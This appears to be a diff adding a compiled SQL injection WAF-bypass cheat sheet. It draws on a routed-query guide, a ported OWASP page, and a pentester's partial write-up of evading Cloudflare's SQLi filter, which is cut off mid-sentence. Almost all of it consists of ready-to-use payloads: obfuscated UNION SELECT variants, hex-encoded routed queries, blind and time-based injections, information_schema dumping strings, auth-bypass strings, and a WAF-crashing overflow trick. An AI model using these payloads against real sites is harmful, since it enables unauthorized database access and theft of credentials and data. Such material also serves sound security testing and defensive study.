@@ -1,0 +1,1490 @@
+Routed queries (advaced WAF bypass)
+If the WAF is very hard to bypass using the given queries, the routed ones might help you.
+
+Identifying how many columns the payload has
+http://domain.com/index.php?id=-1 Union Select 0x3127,2,3,4 0x3127 = 1' (0xHEX converted)
+http://domain.com/index.php?id=-1 Union Select 1,0x3227,3,4 0x3227 = 2' (0xHEX converted)
+http://domain.com/index.php?id=-1 Union Select 1,2,0x3327,4 0x3327 = 3' (0xHEX converted)
+http://domain.com/index.php?id=-1 Union Select 1,2,3,0x3427 0x3427 = 4' (0xHEX converted)
+
+If any of the payloads gives error, it means that the respective column number is vulnerable to be dumped, for example. In our case, the second payload gives error, which means, we can start dumping the second column.
+
+If the website has WAF enabled, you can use the following WAF-based UNION queries. Simply replace Union Select with the following payloads:
+
+/*!50000%55nIoN*/ /*!50000%53eLeCt*/  
+%55nion(%53elect 1,2,3)  
+union+distinctROW+select+1,2,3,4-- -  
+#?uNiOn + #?sEleCt  
+#?1q %0AuNiOn all#qa%0A#%0AsEleCt  
+/*!%55NiOn*/ /*!%53eLEct*/  
++un/**/ion+se/**/lect  
++?UnI?On?+'SeL?ECT?  
+(UnIoN)+(SelECT)+1,2,3,4-- -  
++UnIoN/*&a=*/SeLeCT/*&a=*/  
+%55nion(%53elect 1,2,3,4)-- -  
+/**//*!12345UNION SELECT*//**/  
+/**//*!50000UNION SELECT*//**/  
+/**/UNION/**//*!50000SELECT*//**/  
+/*!50000UniON SeLeCt*/  
+union /*!50000%53elect*/  
+/*!u%6eion*/ /*!se%6cect*/  
+/*--*/union/*--*/select/*--*/  
+union (/*!/**/ SeleCT */ 1,2,3,4)-- -  
+/*!union*/+/*!select*/  
+/**/uNIon/**/sEleCt/**/  
++%2F**/+Union/*!select*/  
+/**//*!union*//**//*!select*//**/  
+/*!uNIOn*/ /*!SelECt*/  
+/**/union/*!50000select*//**/  
+0%a0union%a0select%09  
+%0Aunion%0Aselect%0A  
+uni<on all="" sel="">/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/  
+%252f%252a*/UNION%252f%252a /SELECT%252f%252a*/  
+/*!union*//*--*//*!all*//*--*//*!select*/  
+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C
+/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/  
++UnIoN/*&a=*/SeLeCT/*&a=*/  
+union+sel%0bect  
++#1q%0Aunion all#qa%0A#%0Aselect  
+%23xyz%0AUnIOn%23xyz%0ASeLecT+  
+%23xyz%0A%55nIOn%23xyz%0A%53eLecT+  
+union(select(1),2,3)
+uNioN (/*!/**/ SeleCT */ 11)  
+/**//*U*//*n*//*I*//*o*//*N*//*S*//*e*//*L*//*e*//*c*//*T*/  
+%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/  
++union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C  
+/*!f****U%0d%0aunion*/+/*!f****U%0d%0aSelEct*/  
++UnIoN/*&a=*/SeLeCT/*&a=*/  
++/*!UnIoN*/+/*!SeLeCt*/+  
+/*!u%6eion*/ /*!se%6cect*/  
+uni%20union%20/*!select*/%20  
+union%23aa%0Aselect  
+/**/union/*!50000select*/  
+/^****union.*$/ /^****select.*$/  
+/*union*/union/*select*/select+  
+/*!50000UnION*//*!50000SeLeCt*/  
+%252f%252a*/union%252f%252a /select%252f%252a*/  
+In this case I used the first payload /*!50000%55nIoN*/ /*!50000%53eLeCt*/, so the final payload would be:
+http://domain.com/index.php?id=-1 /*!50000%55nIoN*/ /*!50000%53eLeCt*/ 1,0x3227,3,4
+The payload bypasses WAF and gives SQL Error, which means the 2nd column is vulnerable to be dumped.
+
+Finding the amount of columns (ORDER BY)
+Since we know the second column was vulnerable, we are going to dump it using ORDER BY queries.
+
+Below are Union Distincs queries, which we can use for further enumerating:
+
+and 0e0union distinctROW select 1,2,3,4  
+and .0unIon distincrOw /*!50000sElect*/ 1,2,3,4  
+AnD point(29,9) /*!50000UnION*/ /*!50000SelEcT*/ 1,2,3,4  
+and mod(9,9) UNION SELECT 1,2,3,4  
+'-,1union distinctrow%23aaaaaaaaaaaaaaa%0a select 1,2,3,4  
+.0union distinct/**_**/Select 1,2,3,4  
+union distinct selec%54 1,2,3,4  
+UniOn DISTINCTROW sEleCt 1,2,3,4  
+union distinct select 1,2,3,4  
+union distinctROW select 1,2,3,4  
+In our case the following payload does the job:
+http://domain.com/index.php?id=-1 AnD point(29,9) /*!50000UnION*/ /*!50000SelEcT*/ 1,2,3,4
+
+Replacing the number, so the final payload would be:
+http://domain.com/index.php?id=-1 AnD point(29,9) /*!50000UnION*/ /*!50000SelEcT*/ 1,0x32204f524445522042592031,3,4 where 0x32204f524445522042592031 = 2 ORDER BY 1 (0xHEX converted)
+
+The payload musn't show error. Keep increasing the number by 1 until you see an error. Replace the 0xHEX value on the payload with the following hex, until you will receive an error.
+
+2 ORDER BY 1 -> 0x32204f524445522042592031  
+2 ORDER BY 2 -> 0x32204f524445522042592032  
+2 ORDER BY 3 -> 0x32204f524445522042592033  
+2 ORDER BY 4 -> 0x32204f524445522042592034  
+2 ORDER BY 5 -> 0x32204f524445522042592035  
+2 ORDER BY 6 -> 0x32204f524445522042592036  
+2 ORDER BY 7 -> 0x32204f524445522042592037  
+2 ORDER BY 8 -> 0x32204f524445522042592038  
+and so on...
+
+In our case, 2 ORDER BY 8 is the smallest number which gives an SQL Syntax error, which means the database has 7 columns.
+
+Finding the number of column to dump data
+The following queries are called Union Distinct Rows queries. Because the 7th column is vulnerable, we will add number 7 in front of each payload:
+
+Union Distinct Rows queries	Queries converted to 0xHEX
+2 and 0e0union distinctROW select 1,2,3,4,5,6,7	0x3720616e6420306530756e696f6e2064697374696e6374524f572073656c65637420312c322c332c342c352c362c37
+2 and .0unIon distincrOw /!50000sElect/ 1,2,3,4,5,6,7	0x3720616e64202e30756e496f6e2064697374696e63724f77202f2a21353030303073456c6563742a2f20312c322c332c342c352c362c37
+2 AnD point(29,9) /!50000UnION/ /!50000SelEcT/ 1,2,3,4,5,6,7	0x3720416e4420706f696e742832392c3929202f2a213530303030556e494f4e2a2f202f2a21353030303053656c4563542a2f20312c322c332c342c352c362c37
+2 '-,1union distinctrow%23aaaaaaaaaaaaaaa%0a select 1,2,3,4,5,6,7	0x3720272d2c31756e696f6e2064697374696e6374726f772532336161616161616161616161616161612530612073656c65637420312c322c332c342c352c362c37
+2 .0union distinct/**_**/Select 1,2,3,4,5,6,7	0x37202e30756e696f6e2064697374696e63742f2a2a5f2a2a2f53656c65637420312c322c332c342c352c362c37
+2 union distinct selec%54 1,2,3,4,5,6,7	0xa3720756e696f6e2064697374696e63742073656c656325353420312c322c332c342c352c362c37
+2 UniOn DISTINCTROW sEleCt 1,2,3,4,5,6,7	0x3720556e694f6e2044495354494e4354524f572073456c65437420312c322c332c342c352c362c37
+2+union+distinct+select+1,2,3,4,5,6,7	0x372b756e696f6e2b64697374696e63742b73656c6563742b312c322c332c342c352c362c37
+2+union+distinctROW+select+1,2,3,4,5,6,7	0x372b756e696f6e2b64697374696e6374524f572b73656c6563742b312c322c332c342c352c362c37
+In our case I will use the 3rd payload, so copy the 0xHEX converted payload and use it in the following payload:
+http://domain.com/index.php?id=-1 AnD point(29,9) /*!50000UnION*/ /*!50000SelEcT*/ 1,0x3720416e4420706f696e742832392c3929202f2a213530303030556e494f4e2a2f202f2a21353030303053656c4563542a2f20312c322c332c342c352c362c37,3,4
+
+On the response, a number will be displayed, which tells us the vulnerable column. In this case, number 6 is vulnerable.
+
+Dumping data from the column
+Because we used the payload 2 AnD point(29,9) /*!50000UnION*/ /*!50000SelEcT*/ 1,2,3,4,5,6,7, and because the number 6 was vulnerable (on the website response), our next payload will be (simply replace number 6 with concat(), DIOS, or simple dumping queries):
+
+2 AnD point(29,9) /*!50000UnION*/ /*!50000SelEcT*/ 1,2,3,4,5,database(),7
+
+The Alternative WAY of using And 0 in SQL Injection
+The traditional way of using And 0
+And 1=0
+And false
+And 0
+And 50=60
+Any number that are not the same will equal to (0,false,null)
+The alternative way of using And 0 for WAF Bypass purpose
+Using char() for 0, null, false values
+And char(0)
+And char(false)
+And char(null)
+http://website.com/index.php?id=1 and char(0) Union Select '1 and char(0) union select 1,2,group_concat(0x3c6c693e,table_name,0x203a3a20,column_name),4,5,6 from information_schema.columns where table_schema=database()',2,3,4,5,6--+-
+Any Mathematical/Arithmetic or Logical Problem's that equal to 0
+And 1*0
+And 1-1
+And 0/1
+http://website.com/index.php?id=1 and 1*0 order by 1--
+Using mod()
+And mod(29,9)
+http://website.com/index.php?id=1 and mod(29,9) Order by 10--
+Using point()
+And point(29,9)
+http://website.com/index.php?id=1 and point(29,9) Order by 10--
+Using nullif(1336,1337)
+If one arguments is different nullif(1336,1337) it return the first argument and it will consider as true.So no need to use this.But sometimes it works. Since both arguments are equal it return as null value or it's considered as false,0,null and it will valid as Bypass Method in SQL.
+
+And nullif(1337,1337)
+http://website.com/index.php?id=1 and nullif(1337,1337) Union Select '1 and nullif(1337,1337) union select 1,2,group_concat(0x3c6c693e,table_name,0x203a3a20,column_name),4,5,6 from information_schema.columns where table_schema=database()',2,3,4,5,6--+-
+Illegal parameter data types
+For operation MOD
+% = Modulo
+http://website.com/index.php?id=1 % point(29,9) Order by 10--
+For operation &
+& = Bitwise And
+&& = Logical And
+http://website.com/index.php?id=1 && point(29,9) Order by 10--
+For operation OR
+| = Bitwise OR
+|| = Logical OR, sometimes use for Concatanation
+http://website.com/index.php?id=1 ||point(29,9) Order by 11--
+
+
+Convert it to 0xHEX and paste in in the next payload:
+
+http://domain.com/index.php?id=-1 AnD point(29,9) /*!50000UnION*/ /*!50000SelEcT*/ 1,0x3720416e4420706f696e742832392c3929202f2a213530303030556e494f4e2a2f202f2a21353030303053656c4563542a2f20312c322c332c342c352c646174616261736528292c37,3,4
+
+We successfuly dumped the database name.
+
+I am using database(), because I want to keep the cheatsheet as easy as possible, however you can use DIOS Payloads. The technique is the same, but in the end, convert the whole payload to 0xHEX.
+The Alternative WAY of using Null in SQL Injection
+The traditional way of using Null
+Union Select null,null,null,null
+The alternative way of using Null
+Union Select 0,0,0,0
+Union Select false,false,false,false
+Union Select char(null),char(null),char(null),char(null)
+Union Select char(false),char(false),char(false),char(false)
+Union Select (0*1337-0),(0*1337-0),(0*1337-0),(0*1337-0)
+Union Select 34=35,34=35,34=35,34=35
+Examples
+Using 0
+
+http://website.com/index.php?id=1 div 0 Union Select "0 div 0 Union Select 0,0,0,0,concat(0x222f3e,0x3c62723e,'Injected',0x3c62723e,'<br>','Database :: ',database(),0x3c62723e,'User :: ',user(),0x3c62723e,'Version :: ',version(),0x3c62723e,user(),make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@),0x3c62723e),0--+",0,0,0,0,0--+
+Using false
+
+http://website.com/index.php?id=1 div false Union Select "false div false Union Select false,false,false,false,concat(0x222f3e,0x3c62723e,'Injected',0x3c62723e,'<br>','Database :: ',database(),0x3c62723e,'User :: ',user(),0x3c62723e,'Version :: ',version(),0x3c62723e,user(),make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@),0x3c62723e),false--+",false,false,false,false,false--+
+Using char()
+
+http://website.com/index.php?id=1 div char(null) Union Select "char(null) div char(null) Union Select char(null),char(null),char(null),char(null),concat(0x222f3e,0x3c62723e,'Injected',0x3c62723e,'<br>','Database :: ',database(),0x3c62723e,'User :: ',user(),0x3c62723e,'Version :: ',version(),0x3c62723e,user(),make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@),0x3c62723e),char(null)--+",char(null),char(null),char(null),char(null),char(null)--+
+Using Arithmetic or Logical Operator
+
+http://website.com/index.php?id=1 div (0*1337-0) Union Select "(0*1337-0) div (0*1337-0) Union Select (0*1337-0),(0*1337-0),(0*1337-0),(0*1337-0),concat(0x222f3e,0x3c62723e,'Injected',0x3c62723e,'<br>','Database :: ',database(),0x3c62723e,'User :: ',user(),0x3c62723e,'Version :: ',version(),0x3c62723e,user(),make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@),0x3c62723e),(0*1337-0)--+",(0*1337-0),(0*1337-0),(0*1337-0),(0*1337-0),(0*1337-0)--+
+http://website.com/index.php?id=1 div 34=35 Union Select "34=35 div 34=35 Union Select 34=35,34=35,34=35,34=35,concat(0x222f3e,0x3c62723e,'Injected',0x3c62723e,'<br>','Database :: ',database(),0x3c62723e,'User :: ',user(),0x3c62723e,'Version :: ',version(),0x3c62723e,user(),make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@),0x3c62723e),34=35--+",34=35,34=35,34=35,34=35,34=35--+
+
+SQL Injection Bypassing WAF
+Thank you for visiting OWASP.org. We recently migrated our community to a new web platform and regretably the content for this page needed to be programmatically ported from its previous wiki page. There’s still some work to be done.
+
+SQLi
+A SQL injection attack consists of insertion or “injection” of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system and in some cases issue commands to the operating system. SQL injection attacks are a type of injection attack, in which SQL commands are injected into data-plane input in order to effect the execution of predefined SQL commands.
+
+SQL Injection – Basic Concepts
+There are two types of SQL Injection
+
+• SQL Injection into a String/Char parameter
+  Example: SELECT * from table where example = 'Example'
+
+• SQL Injection into a Numeric parameter
+  Example: SELECT * from table where id = 123
+Exploitation of SQL Injection vulnerabilities is divided into classes according to the DBMS type and injection conditions.
+• A vulnerable request can get into Insert, Update, Delete, etc.
+  Example: UPDATE users SET pass = '1' where user = 't1' OR 1=1--'
+Blind SQL Injection
+ Example: select * from table where id = 1 AND if((ascii(lower(substring((select user()),$i,1))))!=$s,1,benchmark(200000,md5(now())))
+SLEEP(5)--
+SELECT BENCHMARK(1000000,MD5('A'));
+id=1 OR SLEEP(25)=0 LIMIT 1--
+id=1) OR SLEEP(25)=0 LIMIT 1--
+id=1' OR SLEEP(25)=0 LIMIT 1--
+id=1') OR SLEEP(25)=0 LIMIT 1--
+id=1)) OR SLEEP(25)=0 LIMIT 1--
+id=SELECT SLEEP(25)--
+Exploitation features for various DBMSs
+  Example: (MySQL): SELECT * from table where id = 1 union select 1,2,3
+  Example: (PostgreSQL): SELECT * from table where id = 1; select 1,2,3
+Bypassing WAF: SQL Injection - Normalization Method Example Number (1) of a vulnerability in the function of request Normalization. • The following request doesn’t allow anyone to conduct an attack
+
+ /?id=1+union+select+1,2,3/*
+
+• If there is a corresponding vulnerability in the WAF, this request
+
+ will be successfully performed  /?id=1/*union*/union/*select*/select+1,2,3/*
+
+• After being processed by WAF, the request will become
+
+ index.php?id=1/*uni X on*/union/*sel X ect*/select+1,2,3/*
+
+The given example works in case of cleaning of dangerous traffic, not in case of blocking the entire request or the attack source. Example Number (2) of a vulnerability in the function of request Normalization. • Similarly, the following request doesn’t allow anyone to conduct an attack
+
+ /?id=1+union+select+1,2,3/*
+
+• If there is a corresponding vulnerability in the WAF, this request will be successfully performed
+
+ /?id=1+un/**/ion+sel/**/ect+1,2,3--
+
+• The SQL request will become
+
+ SELECT * from table where id =1 union select 1,2,3--
+
+Instead of construction /**/, any symbol sequence that WAF cuts off can be used (e.g., #####, %00).
+
+The given example works in case of excessive cleaning of incoming data (replacement of a regular expression with the empty string).
+
+‘Using HTTP Parameter Pollution (HPP)’
+
+• The following request doesn’t allow anyone to conduct an attack
+
+ /?id=1;select+1,2,3+from+users+where+id=1--
+
+• This request will be successfully performed using HPP
+
+ /?id=1;select+1&id=2,3+from+users+where+id=1--
+
+Successful conduction of an HPP attack bypassing WAF depends on the environment of the application being attacked. EU09 Luca Carettoni, Stefano diPaola
+
+SQL Injection using HTTP Parameter Pollution
+
+Using HTTP Parameter Pollution (HPP)
+
+• Vulnerable code
+
+ SQL=" select key from table where id= "+Request.QueryString("id")
+
+• This request is successfully performed using the HPP technique
+
+ /?id=1/**/union/*&id=*/select/*&id=*/pwd/*&id=*/from/*&id=*/users
+
+• The SQL request becomes select key from table where
+
+ id=1/**/union/*,*/select/*,*/pwd/*,*/from/*,*/users
+
+ByPassing WAF: SQL Injection – HPF Using HTTP Parameter Fragmentation (HPF)
+
+• Vulnerable code example
+
+ Query("select * from table where a=".$_GET['a']." and b=".$_GET['b']);  Query("select * from table where a=".$_GET['a']." and b=".$_GET['b']." limit".$_GET['c']);
+
+• The following request doesn’t allow anyone to conduct an attack
+
+ /?a=1+union+select+1,2/*
+
+• These requests may be successfully performed using HPF
+
+ /?a=1+union/*&b=*/select+1,2  /?a=1+union/*&b=*/select+1,pass/*&c=*/from+users--
+
+• The SQL requests become
+
+ select * from table where a=1 union/* and b=*/select 1,2  select * from table where a=1 union/* and b=*/select 1,pass/* limit */from users--
+
+Bypassing WAF: Blind SQL Injection Using logical requests AND/OR • The following requests allow one to conduct a successful attack for many WAFs
+
+ /?id=1+OR+0x50=0x50  /?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74
+
+Negation and inequality signs (!=, <>, <, >) can be used instead of the equality one – It is amazing, but many WAFs miss it!
+
+It becomes possible to exploit the vulnerability with the method of blind-SQL Injection by replacing SQL functions that get to WAF signatures with their synonyms. substring() -> mid(), substr() ascii() -> hex(), bin() benchmark() -> sleep() Wide variety of logical requests. and 1 or 1 and 1=1 and 2<3 and ‘a’=’a’ and ‘a’<>‘b’ and char(32)=’ ‘ and 3<=2 and 5<=>4 and 5<=>5 and 5 is null or 5 is not null …. An example of various request notations with the same meaning. select user from mysql.user where user = ‘user’ OR mid(password,1,1)=’*’ select user from mysql.user where user = ‘user’ OR mid(password,1,1)=0x2a select user from mysql.user where user = ‘user’ OR mid(password,1,1)=unhex(‘2a’) select user from mysql.user where user = ‘user’ OR mid(password,1,1) regexp ‘[*]’ select user from mysql.user where user = ‘user’ OR mid(password,1,1) like ‘*’ select user from mysql.user where user = ‘user’ OR mid(password,1,1) rlike ‘[*]’ select user from mysql.user where user = ‘user’ OR ord(mid(password,1,1))=42 select user from mysql.user where user = ‘user’ OR ascii(mid(password,1,1))=42 select user from mysql.user where user = ‘user’ OR find_in_set(‘2a’,hex(mid(password,1,1)))=1 select user from mysql.user where user = ‘user’ OR position(0x2a in password)=1 select user from mysql.user where user = ‘user’ OR locate(0x2a,password)=1 Known: substring((select ‘password’),1,1) = 0x70 substr((select ‘password’),1,1) = 0x70 mid((select ‘password’),1,1) = 0x70 New: strcmp(left(‘password’,1), 0x69) = 1 strcmp(left(‘password’,1), 0x70) = 0 strcmp(left(‘password’,1), 0x71) = -1 STRCMP(expr1,expr2) returns 0 if the strings are the same, -1 if the first , argument is smaller than the second one, and 1 otherwise.
+
+An example of signature bypass. The following request gets to WAF signature /?id=1+union+(select+1,2+from+users) But sometimes, the signatures used can be bypassed /?id=1+union+(select+’xz’from+xxx)
+
+/?id=(1)union(select(1),mid(hash,1,32)from(users)) /?id=1+union+(select'1',concat(login,hash)from+users) /?id=(1)union(((((((select(1),hex(hash)from(users)))))))) /?id=(1)or(0x50=0x50)
+
+An SQL Injection attack can successfully bypass the WAF , and be conducted in all following cases: • Vulnerabilities in the functions of WAF request normalization. • Application of HPP and HPF techniques. • Bypassing filter rules (signatures). • Vulnerability exploitation by the method of blind SQL Injection. • Attacking the application operating logics (and/or)
+
+WAF Bypassing Strings.
+
+ /*!%55NiOn*/ /*!%53eLEct*/   %55nion(%53elect 1,2,3)-- -   +union+distinct+select+   +union+distinctROW+select+   /**//*!12345UNION SELECT*//**/   concat(0x223e,@@version)   concat(0x273e27,version(),0x3c212d2d)   concat(0x223e3c62723e,version(),0x3c696d67207372633d22)   concat(0x223e,@@version,0x3c696d67207372633d22)   concat(0x223e,0x3c62723e3c62723e3c62723e,@@version,0x3c696d67207372633d22,0x3c62​723e)   concat(0x223e3c62723e,@@version,0x3a,”BlackRose”,0x3c696d67207372633d22)   concat(‘’,@@version,’’)   /**//*!50000UNION SELECT*//**/   /**/UNION/**//*!50000SELECT*//**/   /*!50000UniON SeLeCt*/   union /*!50000%53elect*/   +#uNiOn+#sEleCt   +#1q%0AuNiOn all#qa%0A#%0AsEleCt   /*!%55NiOn*/ /*!%53eLEct*/   /*!u%6eion*/ /*!se%6cect*/   +un/**/ion+se/**/lect   uni%0bon+se%0blect   %2f**%2funion%2f**%2fselect   union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A   REVERSE(noinu)+REVERSE(tceles)   /*--*/union/*--*/select/*--*/   union (/*!/**/ SeleCT */ 1,2,3)   /*!union*/+/*!select*/   union+/*!select*/   /**/union/**/select/**/   /**/uNIon/**/sEleCt/**/   /**//*!union*//**//*!select*//**/   /*!uNIOn*/ /*!SelECt*/   +union+distinct+select+   +union+distinctROW+select+   +UnIOn%0d%0aSeleCt%0d%0a   UNION/*&test=1*/SELECT/*&pwn=2*/   un?+un/**/ion+se/**/lect+   +UNunionION+SEselectLECT+   +uni%0bon+se%0blect+   %252f%252a*/union%252f%252a /select%252f%252a*/   /%2A%2A/union/%2A%2A/select/%2A%2A/   %2f**%2funion%2f**%2fselect%2f**%2f   union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A   /*!UnIoN*/SeLecT+
+
+Union Select by PASS with Url Encoded Method: %55nion(%53elect) union%20distinct%20select union%20%64istinctRO%57%20select union%2053elect %23?%0auion%20?%23?%0aselect %23?zen?%0Aunion all%23zen%0A%23Zen%0Aselect %55nion %53eLEct u%6eion se%6cect unio%6e %73elect unio%6e%20%64istinc%74%20%73elect uni%6fn distinct%52OW s%65lect %75%6e%6f%69%6e %61%6c%6c %73%65%6c%65%63%7 Illegal mix of Collations ByPass Method : unhex(hex(Concat(Column_Name,0x3e,Table_schema,0x3e,table_Name)))
+
+   /*!from*/information_schema.columns/*!where*/column_name%20/*!like*/char(37,%20112,%2097,%20115,%20115,%2037)
+
+   union select 1,2,unhex(hex(Concat(Column_Name,0x3e,Table_schema,0x3e,table_Name))),4,5 /*!from*/information_schema.columns/*!where*/column_name%20/*!like*/char(37,%20112,%2097,%20115,%20115,%2037)?
+
+Bypass with Comments
+SQL comments allow us to bypass a lot of filtering and WAFs.
+
+ Code :
+ http://victim.com/news.php?id=1+un/**/ion+se/**/lect+1,2,3--
+
+Case Changing
+Some WAFs filter only lowercase SQL keyword.
+
+Regex Filter: /union\sselect/g
+
+http://victim.com/news.php?id=1+UnIoN/**/SeLecT/**/1,2,3--
+Replaced Keywords
+Some application and WAFs use preg_replace to remove all SQL keyword. So we can bypass easily.
+
+http://victim.com/news.php?id=1+UNunionION+SEselectLECT+1,2,3--
+Some case SQL keyword was filtered out and replaced with whitespace. So we can use “%0b” to bypass.
+
+http://victim.com/news.php?id=1+uni%0bon+se%0blect+1,2,3--
+For Mod_rewrite, Comments “/**/” cannot bypassed. So we use “%0b” replace “/**/”.
+
+Forbidden: http://victim.com/main/news/id/1/**/
+|
+|/**/lpad(first_name,7,1).html
+Bypassed : http://victim.com/main/news/id/1%0b
+|
+|%0blpad(first_name,7,1).html
+Advanced Methods
+Crash Firewall via doing Buffer Over Flow.
+
+1) Buffer Overflow / Firewall Crash: Many Firewalls are developed in C/C++ and we can Crash them using Buffer Overflow.
+
+    http://www.site.com/index.php?page_id=-15+and+(select 1)=(Select 0xAA[..(add about 1000 “A”)..])+/*!uNIOn*/+/*!SeLECt*/+1,2,3,4….
+
+    You can test if the WAF can be crashed by typing:
+    ?page_id=null%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/+1,2,3,4….
+
+    If you get a 500, you can exploit it using the Buffer Overflow Method.
+2) Replace Characters with their HEX Values: We can replace some characters with their HEX (URL-Encoded) Values.
+
+Example:
+    http://www.site.com/index.php?page_id=-15 /*!u%6eion*/ /*!se%6cect*/ 1,2,3,4….
+    (which means “union select”)
+4) Misc Exploitable Functions: Many firewalls try to offer more Protection by adding Prototype or Strange Functions! (Which, of course, we can exploit!):
+
+Example:
+    This firewall below replaces “*” (asterisks) with Whitespaces! What we can do is this:
+    http://www.site.com/index.php?page_id=-15+uni*on+sel*ect+1,2,3,4…
+    (If the Firewall removes the “*”, the result will be: 15+union+select….)
+    So, if you find such a silly function, you can exploit it, in this way.
+Auth Bypass
+If we need to bypass some admin panels, and we do that using or 1=1.
+
+Code:
+or 1-- -' or 1 or '1"or 1 or"
+SELECT * FROM login WHERE id=1 or 1– -‘ or 1 or ‘1”or 1 or” AND username=’’ AND password=’’ the “or 1– -“ gets active, make the condition true and ignores the rest of the query. now lets check regular string-
+
+SELECT * FROM login WHERE username=’ or 1– -‘ or 1 or ‘1”or 1 or” ‘ ….. the “or 1” part make the query true, and the other parts are considered as the comparison strings. same with the double quotes. SELECT * FROM login WHERE username=” or 1– -‘ or 1 or ‘1”or 1 or” “
+How I bypassed Cloudflare's SQL Injection filter
+on Web 04 SEP 2020
+In late 2018 I was tasked with performing a Web Application security assessment for a large client. After running the standard scans with automated tools, something interesting came up: a possible SQL injection which couldn’t be exploited using the tool. The reason: Cloudflare’s WAF and more specifically its SQL Injection filter.
+
+Details about the application
+The application was a generic website written in PHP with MySQL as the backend DBMS. The vulnerable page submitted a POST request with multipart form body data to the /index.php endpoint. I honestly don’t remember the use of the form and it doesn’t really matter for the writeup. The POST request looked like this:
+
+POST /index.php HTTP/1.1
+Host: ******
+Connection: close
+Accept-Encoding: gzip, deflate
+Accept: */*
+Content-Type: multipart/form-data; boundary=dc30b7aab06d4aff91d4285d7e60d4f3
+
+--dc30b7aab06d4aff91d4285d7e60d4f3
+Content-Disposition: form-data; name="126"
+
+###### ###### ########## ########
+--dc30b7aab06d4aff91d4285d7e60d4f3
+Content-Disposition: form-data; name="127"
+
+###### ###### ########## ########
+--dc30b7aab06d4aff91d4285d7e60d4f3
+Content-Disposition: form-data; name="130"
+
+...
+...
+
+###### #### 6 ########
+--dc30b7aab06d4aff91d4285d7e60d4f3
+Content-Disposition: form-data; name="task"
+
+form.save
+--dc30b7aab06d4aff91d4285d7e60d4f3
+Content-Disposition: form-data; name="form_id"
+
+X-MARK
+--dc30b7aab06d4aff91d4285d7e60d4f3
+Content-Disposition: form-data; name="96"
+
+############
+--dc30b7aab06d4aff91d4285d7e60d4f3
+
+...
+...
+
+Content-Disposition: form-data; name="115[]"
+
+########## ################## #### ###### ######
+--dc30b7aab06d4aff91d4285d7e60d4f3
+Content-Disposition: form-data; name="125"
+
+###### ###### ########## ########
+--dc30b7aab06d4aff91d4285d7e60d4f3--
+The unsanitized parameter at X-MARK can be used to inject arbitrary values at the place of the WHERE clause of an SQL SELECT query. For example, if the above data was sent as the body of the POST request, the SQL query which would be executed on the server would look something like this:
+
+SELECT c1,c2,c3 FROM t1 WHERE X-MARK;
+The technique typically used for this kind of injection is a Time-based Blind SQL injection. The problem was, that Cloudflare would recognize these kinds of injections and block them on the spot. No matter how complicated I tried to make the query or how many sqlmap tamper scripts I used, Cloudflare was always there.
+
+To overcome this issue, I used an observation I made while manually testing for SQL injections on the same request: I had noticed that when I tried to inject code that resulted in something close to the following SQL query:
+
+SELECT c1,c2,c3 FROM t1 WHERE 'a'='a';
+the web server responded with status 200 OK. When I tried to inject code that resulted in something close to this SQL query:
+
+SELECT c1,c2,c3 FROM t1 WHERE 'a'='b';
+the server responded with status 500 Internal Server Error.
+
+In other words when the SQL query in the backend did NOT return results, the web server complained and crashed (probably because the backend code tried to access an item in the returned list whose index was out of range). This gave me an idea: writing a script that compared a character picked from the name of the required DBMS entity and sequentially compared it with all characters. The idea was, if the two characters matched, the server would return a 200 OK status, else it would return a 500 Internal Server Error status and I would have to compare the requested character with the next character in my list.
+
+First Try
+My thinking was that if a wanted to find the first second character of the name of the fifth table (as they are listed in information_schema.tables), I would start by asking MySQL if that character is equal to ‘a’ and if not I would continue with ‘b’, ‘c’ etc. I would start by inject the following string (for comparison with ‘a’):
+
+'a' =
+ (SELECT SUBSTRING(table_name, 2, 1)
+  FROM information_schema.tables
+  LIMIT 4, 1
+ )
+which would result in the following SQL query to be executed on the server:
+
+SELECT c1,c2,c3 FROM t1
+WHERE 'a' =
+ (SELECT SUBSTRING(table_name, 2, 1)
+  FROM information_schema.tables
+  LIMIT 4, 1
+ )
+When I found the table name to be t1 for example, I was to brute force its columns’ names with the following starting injection:
+
+INJECTION 1
+
+'a' =
+ (SELECT SUBSTRING(column_name, 1, 1)
+  FROM information_schema.columns
+  WHERE table_name = "t1"
+  LIMIT 0, 1
+ )
+and then actually get values out of column c1 of table t1 by starting with the following injection:
+
+'a' =
+ (SELECT SUBSTRING(c1, 1, 1)
+  FROM t1
+  LIMIT 0, 1
+ )
+The idea was good, but Cloudflare would complain about the ‘=’ sign. The injection
+
+'a' = 'b'
+would get blocked by Cloudflare’s WAF. After a bit of fiddling, I came up with the following request that bypassed the ‘=’ restriction:
+
+'a' LIKE 'b'
+This means that the initial injection INJECTION 1 would become:
+
+'a' LIKE
+ (SELECT SUBSTRING(column_name, 1, 1)
+  FROM information_schema.columns
+  WHERE table_name = "t1"
+  LIMIT 0, 1
+ )
+Second Try
+INJECTION 1 was still not ready to go. Cloudflare would still complain about stuff. More specifically the injection
+
+'a' LIKE 'b'
+would still get blocked, not because of the LIKE keyword, but because of the ‘a’ character. Comparing plain strings to anything was not allowed. To overcome this issue I came up with the following injection that went through undetected by the WAF:
+
+'0x61' LIKE 'b'
